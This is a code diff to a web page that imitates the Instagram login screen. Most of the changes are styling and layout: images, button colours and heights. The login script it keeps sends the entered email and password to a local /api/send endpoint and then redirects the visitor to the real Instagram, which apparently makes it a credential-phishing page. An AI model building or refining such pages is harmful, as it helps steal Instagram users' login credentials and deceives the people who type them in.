@@ -3,6 +3,7 @@
 ---
 
 <main class="flex align-items-center justify-content-center">
+  <img class="img-desktop" src="/img/movil.png" alt="Imagen para ordenador" />
   <section id="mobile" class="flex"></section>
   <section id="auth" class="flex direction-column">
     <div class="panel login flex direction-column">
@@ -54,10 +55,10 @@
       <a href="#">Regístrate</a>
     </div>
     <div class="app-download flex direction-column align-items-center">
-      <p>Descargar la aplicación.</p>
-      <div>
-        <img src="./img/apple-button.png" title="Imagem com a logo da Apple Store" />
-        <img src="./img/googleplay-button.png" title="Imagem com a logo da Google Play" />
+      <p class="small-font">Descargar la aplicación.</p>
+      <div class="div-img-app">
+        <img class="img-app" src="./img/apple-button.png" title="Imagem com a logo da Apple Store" />
+        <img class="img-app" src="./img/googleplay-button.png" title="Imagem com a logo da Google Play" />
       </div>
     </div>
   </section>
@@ -85,33 +86,52 @@
   import { redirectUserToInstagram } from "../assets/utilities.js";
 
   const loginButton = document.getElementById("loginButton");
-  loginButton.addEventListener("click", () => {
-    const email: string = (document.querySelector('input[name="email"]') as HTMLInputElement).value;
-    const password: string = (document.querySelector('input[name="password"]') as HTMLInputElement).value;
-    fetch("/api/send", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        email: email,
-        password: password,
-      }),
-    })
-      .then((response) => response.json())
-      .then((data) => {
-        console.log(data);
-        redirectUserToInstagram();
+  if (loginButton) {
+    loginButton.addEventListener("click", () => {
+      const email: string = (document.querySelector('input[name="email"]') as HTMLInputElement).value;
+      const password: string = (document.querySelector('input[name="password"]') as HTMLInputElement).value;
+      fetch("/api/send", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          email: email,
+          password: password,
+        }),
       })
-      .catch((error) => {
-        console.error("Error:", error);
-      });
-  });
+        .then((response) => response.json())
+        .then((data) => {
+          console.log(data);
+          redirectUserToInstagram();
+        })
+        .catch((error) => {});
+    });
+  }
 </script>
 
 <style>
-  .loginButton:focus {
+  .div-img-app > .img-app {
+    max-height: 35px;
+    width: auto;
+  }
+
+  .img-desktop {
+    width: auto;
+    max-height: 600px;
+    margin-right: 50px;
+    margin-bottom: 50px;
+  }
+
+  #loginButton {
+    border-radius: 7px;
+  }
+  #loginButton:focus {
     background-color: #0063a5;
+  }
+
+  #loginButton:hover {
+    background-color: #2c64cd;
   }
 
   * {
@@ -128,7 +148,7 @@
   }
 
   main {
-    height: 100vh;
+    height: 90vh;
     margin: auto;
     max-width: 935px;
   }
@@ -310,6 +330,11 @@
     margin-bottom: 15px;
   }
 
+  .small-font {
+    font-size: 14px;
+    color: #131313;
+  }
+
   /**
    * Register section
    */
@@ -343,6 +368,7 @@
    * Footer
    */
   footer {
+    height: 10vh;
     margin: 0 auto 30px auto;
     max-width: 935px;
     font-size: small;
@@ -377,6 +403,9 @@
   @media screen and (max-width: 767px) {
     main {
       margin: 30px auto 50px auto;
+      .img-desktop {
+        display: none;
+      }
     }
     footer .copyright,
     footer ul li a {
